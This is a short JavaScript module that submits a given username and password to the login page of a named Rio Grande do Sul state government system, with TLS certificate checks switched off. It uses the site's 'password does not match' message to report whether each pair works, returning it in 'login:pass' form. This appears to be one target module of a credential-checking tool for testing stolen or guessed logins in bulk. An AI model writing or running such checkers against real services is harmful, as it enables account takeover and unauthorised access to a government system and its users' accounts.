import axios from "axios";
import https from 'https'
import request from '../core/configs.js'

export default async function sgcRs(login, pass) {

  const url = 'https://sgc.bm.rs.gov.br/login.php'

  
  const dataRequest = `txt_name=${login}&txt_pws=${pass}&submit=`;

  const { data } = await axios({
    method: "POST",
    headers: request.headers,
    data: dataRequest,
    url: url,
    httpsAgent: new https.Agent({  
        rejectUnauthorized: false 
      }),

  });

  if (data.includes("Sua senha não confere !"))
    return {
      success: false,
      login: login + ":" + pass,
      uri: url,
    };
  return {
    success: true,
    login: login + ":" + pass,
    uri: url,
  };
}


